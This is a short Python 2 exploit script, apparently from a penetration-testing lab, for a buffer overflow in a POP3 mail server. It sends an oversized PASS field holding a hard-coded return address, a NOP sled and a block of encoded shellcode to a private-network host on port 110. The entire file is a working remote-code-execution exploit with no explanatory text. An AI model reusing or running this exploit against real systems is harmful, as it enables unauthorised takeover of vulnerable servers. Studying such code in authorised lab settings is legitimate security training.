#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 5F4A358F
shellcode = ("\xda\xcd\xbd\xb6\xea\xd9\xcf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x6e\x13\x03\xd8\xf9\x3b\x3a\xd8\x16\x39"
"\xc5\x20\xe7\x5e\x4f\xc5\xd6\x5e\x2b\x8e\x49\x6f\x3f\xc2\x65"
"\x04\x6d\xf6\xfe\x68\xba\xf9\xb7\xc7\x9c\x34\x47\x7b\xdc\x57"
"\xcb\x86\x31\xb7\xf2\x48\x44\xb6\x33\xb4\xa5\xea\xec\xb2\x18"
"\x1a\x98\x8f\xa0\x91\xd2\x1e\xa1\x46\xa2\x21\x80\xd9\xb8\x7b"
"\x02\xd8\x6d\xf0\x0b\xc2\x72\x3d\xc5\x79\x40\xc9\xd4\xab\x98"
"\x32\x7a\x92\x14\xc1\x82\xd3\x93\x3a\xf1\x2d\xe0\xc7\x02\xea"
"\x9a\x13\x86\xe8\x3d\xd7\x30\xd4\xbc\x34\xa6\x9f\xb3\xf1\xac"
"\xc7\xd7\x04\x60\x7c\xe3\x8d\x87\x52\x65\xd5\xa3\x76\x2d\x8d"
"\xca\x2f\x8b\x60\xf2\x2f\x74\xdc\x56\x24\x99\x09\xeb\x67\xf6"
"\xfe\xc6\x97\x06\x69\x50\xe4\x34\x36\xca\x62\x75\xbf\xd4\x75"
"\x7a\xea\xa1\xe9\x85\x15\xd2\x20\x42\x41\x82\x5a\x63\xea\x49"
"\x9a\x8c\x3f\xdd\xca\x22\x90\x9e\xba\x82\x40\x77\xd0\x0c\xbe"
"\x67\xdb\xc6\xd7\x02\x26\x81\xdd\xd9\x28\x62\x8a\xdf\x28\x85"
"\xf1\x69\xce\xef\x15\x3c\x59\x98\x8c\x65\x11\x39\x50\xb0\x5c"
"\x79\xda\x37\xa1\x34\x2b\x3d\xb1\xa1\xdb\x08\xeb\x64\xe3\xa6"
"\x83\xeb\x76\x2d\x53\x65\x6b\xfa\x04\x22\x5d\xf3\xc0\xde\xc4"
"\xad\xf6\x22\x90\x96\xb2\xf8\x61\x18\x3b\x8c\xde\x3e\x2b\x48"
"\xde\x7a\x1f\x04\x89\xd4\xc9\xe2\x63\x97\xa3\xbc\xd8\x71\x23"
"\x38\x13\x42\x35\x45\x7e\x34\xd9\xf4\xd7\x01\xe6\x39\xb0\x85"
"\x9f\x27\x20\x69\x4a\xec\x50\x20\xd6\x45\xf9\xed\x83\xd7\x64"
"\x0e\x7e\x1b\x91\x8d\x8a\xe4\x66\x8d\xff\xe1\x23\x09\xec\x9b"
"\x3c\xfc\x12\x0f\x3c\xd5")

#buffer = "A"*2606 +"\x8f\x35\x4a\x5f" +"C"*(3500-2606-4)

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.21.97', 110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
